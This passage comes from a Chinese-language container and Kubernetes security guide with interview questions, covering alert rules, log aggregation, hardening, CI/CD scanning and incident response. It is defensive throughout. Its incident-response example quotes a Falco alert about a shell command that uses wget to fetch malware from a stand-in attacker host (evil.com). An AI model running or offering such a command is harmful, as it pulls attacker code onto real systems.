            group_left()
            (kube_pod_spec_containers_privileged == 1)
          for: 1m
          labels:
            severity: critical
          annotations:
            summary: "检测到特权容器"
            description: "命名空间 {{ $labels.namespace }} 中的 Pod {{ $labels.pod }} 正在以特权模式运行"

        # 容器以 root 身份运行告警
        - alert: ContainerRunningAsRoot
          expr: |
            kube_pod_container_info{container!=""}
            * on (pod, namespace)
            group_left()
            (kube_pod_container_status_running{container!=""} == 1)
            * on (pod, namespace)
            group_left()
            (kube_pod_spec_containers_runasnonroot == 0 or absent(kube_pod_spec_containers_runasnonroot))
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "容器以 root 身份运行"
            description: "Pod {{ $labels.pod }} 中的容器 {{ $labels.container }} 正在以 root 身份运行"

        # 镜像漏洞告警
        - alert: HighVulnerabilityImageDetected
          expr: trivy_vulnerability_count{severity="CRITICAL"} > 0
          for: 1m
          labels:
            severity: critical
          annotations:
            summary: "检测到高危漏洞镜像"
            description: "镜像 {{ $labels.image }} 存在 {{ $value }} 个严重漏洞"

        # 没有资源限制的 Pod
        - alert: PodWithoutResourceLimits
          expr: |
            kube_pod_container_resource_limits{resource="memory"} == 0
            or
            kube_pod_container_resource_limits{resource="cpu"} == 0
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "Pod 没有资源限制"
            description: "Pod {{ $labels.pod }} 中的容器 {{ $labels.container }} 没有资源限制"
```

### 安全日志聚合

```yaml
# Fluentd 配置 - 收集容器安全日志
apiVersion: v1
kind: ConfigMap
metadata:
  name: fluentd-config
  namespace: logging
data:
  fluent.conf: |
    # 收集 Falco 告警
    <source>
      @type tail
      path /var/log/falco/falco.log
      pos_file /var/log/fluentd/falco.log.pos
      tag falco.*
      <parse>
        @type json
        time_key time
        time_format %Y-%m-%dT%H:%M:%S.%L%z
      </parse>
    </source>

    # 收集 Kubernetes 审计日志
    <source>
      @type tail
      path /var/log/kubernetes/audit.log
      pos_file /var/log/fluentd/k8s-audit.log.pos
      tag kubernetes.audit
      <parse>
        @type json
      </parse>
    </source>

    # 添加安全相关标签
    <filter falco.**>
      @type record_transformer
      <record>
        log_type security_alert
        source falco
      </record>
    </filter>

    # 过滤高优先级安全事件
    <filter kubernetes.audit>
      @type grep
      <regexp>
        key $.verb
        pattern (create|update|delete|patch)
      </regexp>
    </filter>

    # 输出到 Elasticsearch
    <match **>
      @type elasticsearch
      host elasticsearch.logging.svc
      port 9200
      index_name container-security-%Y.%m.%d
      <buffer>
        @type file
        path /var/log/fluentd/buffer
        flush_interval 5s
      </buffer>
    </match>
```

## 面试重点

### 核心概念问题

**问题 1：什么是容器逃逸？如何防止？**

```
要点：
1. 容器逃逸定义：
   - 攻击者突破容器隔离以获取主机访问权限的过程

2. 常见逃逸方法：
   - 内核漏洞利用（如 Dirty COW、CVE-2019-5736）
   - 特权容器滥用
   - 不当的卷挂载（Docker socket、/etc、/proc）
   - 能力滥用

3. 防护措施：
   - 以非 root 用户运行
   - 禁用特权模式
   - 删除不必要的能力
   - 使用 Seccomp 和 AppArmor
   - 保持内核和容器运行时更新
   - 只读文件系统
   - 资源限制（CPU、内存、PID）
   - 使用 gVisor 或 Kata Containers 进行更强的隔离
```

**问题 2：解释 Kubernetes Pod 安全标准**

```
要点：
1. 三个安全级别：
   - Privileged：无限制
   - Baseline：防止已知的权限提升
   - Restricted：最严格的安全限制

2. 执行模式：
   - enforce：拒绝不符合的 Pod
   - audit：允许但记录违规
   - warn：允许但发出警告

3. Restricted 级别要求：
   - 必须以非 root 身份运行
   - 禁用特权模式
   - 禁用权限提升
   - 必须删除所有能力
   - 必须使用 seccomp 配置文件
   - 必须使用只读根文件系统（推荐）
```

**问题 3：如何安全管理 Kubernetes Secrets？**

```
要点：
1. Secrets 的局限性：
   - Base64 编码不是加密
   - 在 etcd 中默认不加密
   - 授权用户可以读取

2. 安全增强措施：
   - 启用 etcd 加密（EncryptionConfiguration）
   - 使用外部密钥管理（Vault、AWS Secrets Manager）
   - 实施最小权限 RBAC
   - 审计 secrets 访问
   - 定期轮换 secrets

3. 最佳实践：
   - 使用 External Secrets Operator
   - Vault Agent Sidecar 注入
   - 避免使用环境变量传递敏感数据（使用挂载文件）
   - 永远不要将 secrets 提交到版本控制
   - 在 GitOps 工作流中使用 sealed-secrets
```

### 实践场景问题

**问题 4：设计安全的 CI/CD 镜像构建流水线**

```yaml
# 答案示例：GitLab CI/CD 安全构建流水线
stages:
  - build
  - scan
  - sign
  - deploy

variables:
  IMAGE_TAG: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

build:
  stage: build
  image: docker:24-dind
  script:
    # 使用 BuildKit 增强安全性
    - export DOCKER_BUILDKIT=1
    - docker build
        --no-cache
        --pull
        --secret id=npm_token,env=NPM_TOKEN
        -t $IMAGE_TAG .
    - docker push $IMAGE_TAG

vulnerability-scan:
  stage: scan
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity CRITICAL $IMAGE_TAG
    - trivy image --format sarif --output trivy-report.sarif $IMAGE_TAG
  artifacts:
    reports:
      sast: trivy-report.sarif

sign-image:
  stage: sign
  image: gcr.io/projectsigstore/cosign:latest
  script:
    - cosign sign --key cosign.key $IMAGE_TAG
    - cosign verify --key cosign.pub $IMAGE_TAG

deploy:
  stage: deploy
  script:
    - kubectl set image deployment/app app=$IMAGE_TAG
  only:
    - main
  environment:
    name: production
```

**问题 5：诊断和响应容器安全事件**

```bash
# 事件响应流程示例

# 检测 - Falco 告警触发
# "在容器 myapp-pod 中检测到可疑进程执行：/bin/sh -c wget http://evil.com/malware"

# 遏制 - 隔离受影响的 Pod
kubectl label pod myapp-pod quarantine=true --overwrite
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-policy
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes:
  - Ingress
  - Egress
  # 完全隔离，不允许任何流量
EOF

# 证据收集
kubectl logs myapp-pod > /evidence/pod-logs.txt
kubectl describe pod myapp-pod > /evidence/pod-describe.txt
kubectl get events --field-selector involvedObject.name=myapp-pod > /evidence/events.txt

# 分析 - 检查容器进程
kubectl exec myapp-pod -- ps aux
kubectl exec myapp-pod -- cat /proc/1/cmdline

# 根除 - 删除受感染的 Pod
kubectl delete pod myapp-pod

# 恢复 - 从安全镜像重新部署
kubectl rollout restart deployment myapp

# 经验教训 - 更新安全策略
# - 添加网络策略限制出站流量
# - 更新镜像扫描规则
# - 增强运行时监控
```

### 安全架构设计问题

**问题 6：设计多租户 Kubernetes 集群安全架构**

```
要点：

1. 命名空间隔离
   - 每个租户独立命名空间
   - 资源配额
   - 网络策略隔离

2. RBAC 设计
   - 租户特定的 ServiceAccount
   - 最小权限原则
   - 禁止跨命名空间访问

3. 网络隔离
   - 默认拒绝所有流量
   - 基于白名单的允许规则
   - 服务网格实现 mTLS

4. 资源隔离
   - 节点亲和性/污点
   - Pod 安全策略
   - 资源配额

5. 监控和审计
   - 租户级别日志隔离
   - 审计日志
   - 安全告警
```

### 常见安全漏洞及修复

| 漏洞类型 | 风险级别 | 修复方法 |
|----------|----------|----------|
| 特权容器 | 严重 | 移除 --privileged，使用细粒度能力 |
| 以 root 身份运行 | 高 | 使用 USER 指令指定非 root 用户 |
| 敏感目录挂载 | 严重 | 避免挂载 /etc、/var/run/docker.sock |
| 无资源限制 | 中 | 设置 resources.limits |
| 未扫描的镜像 | 高 | 在 CI/CD 中集成 Trivy |
| 明文 secrets | 高 | 使用 Vault 或外部密钥管理 |
| 过于宽松的网络策略 | 中 | 实施最小权限网络策略 |
| 缺少安全上下文 | 高 | 配置 securityContext |
| 过时的基础镜像 | 高 | 定期更新镜像，自动扫描 |
| 缺少镜像签名 | 中 | 使用 Cosign 实现镜像签名 |

## 延伸阅读

### 官方文档

- [Docker 安全文档](https://docs.docker.com/engine/security/)
- [Kubernetes 安全文档](https://kubernetes.io/docs/concepts/security/)
- [CIS Docker 基准](https://www.cisecurity.org/benchmark/docker)
- [CIS Kubernetes 基准](https://www.cisecurity.org/benchmark/kubernetes)
- [NIST 容器安全指南](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)

### 工具和框架

- [Trivy](https://github.com/aquasecurity/trivy) - 全面的漏洞扫描器
- [Falco](https://falco.org/) - 运行时安全监控
- [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) - 策略执行
- [Kyverno](https://kyverno.io/) - Kubernetes 原生策略管理
- [Cosign](https://github.com/sigstore/cosign) - 容器签名和验证
- [kubeaudit](https://github.com/Shopify/kubeaudit) - Kubernetes 安全审计
- [kube-bench](https://github.com/aquasecurity/kube-bench) - CIS 基准检查器
- [Snyk Container](https://snyk.io/product/container-vulnerability-management/) - 容器漏洞管理

### 学习资源

- [Kubernetes 安全学院](https://kubernetes.io/docs/tutorials/security/)
- [Aqua Security 博客](https://blog.aquasec.com/)
- [Sysdig 安全博客](https://sysdig.com/blog/)
- [CNCF 安全技术咨询组](https://github.com/cncf/tag-security)

### 书籍和深度资源

- "Container Security" by Liz Rice (O'Reilly)
- "Kubernetes Security and Observability" by Brendan Creane and Amit Gupta
- "Hacking Kubernetes" by Andrew Martin and Michael Hausenblas

### 高级主题

- **供应链安全**：SLSA 框架、in-toto 证明、SBOM 生成
- **零信任架构**：服务网格安全、工作负载身份
- **机密计算**：加密容器、安全飞地
- **基于 eBPF 的安全**：Cilium、Tetragon 用于内核级安全

## 总结

容器安全是一个多层次、全面的防护系统，需要在镜像构建、运行时、编排层和网络层等多个维度进行防御。核心原则包括：

1. **最小权限原则**：仅授予必要的权限，删除不需要的能力
2. **纵深防御**：多重安全措施确保单点故障不会导致完全失陷
3. **零信任架构**：不信任任何组件，始终验证身份和权限
4. **持续监控**：实时异常检测，快速事件响应
5. **自动化安全**：将安全检查集成到 CI/CD 流水线中
6. **不可变基础设施**：将容器视为不可变的，重建而非修补
7. **左移安全**：在开发生命周期早期集成安全

通过实施本文介绍的最佳实践，您可以显著提高容器化应用的安全态势，有效防御各种容器安全威胁。请记住，安全不是一次性的工作，而是一个持续的过程，必须随着基础设施和威胁环境的变化而演进。
